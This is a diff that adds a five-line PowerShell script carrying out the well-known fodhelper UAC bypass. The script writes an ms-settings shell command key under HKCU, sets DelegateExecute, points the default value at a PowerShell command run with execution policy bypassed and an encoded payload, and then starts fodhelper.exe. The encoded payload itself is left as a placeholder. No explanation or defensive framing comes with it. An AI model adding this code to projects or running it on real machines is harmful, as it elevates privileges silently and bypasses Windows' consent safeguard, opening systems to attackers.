@@ -1,0 +1,5 @@
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -PropertyType String -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -exec bypass -enc <base64-encoded string>" -Force
+Start-Process "C:\Windows\System32\fodhelper.exe"
+
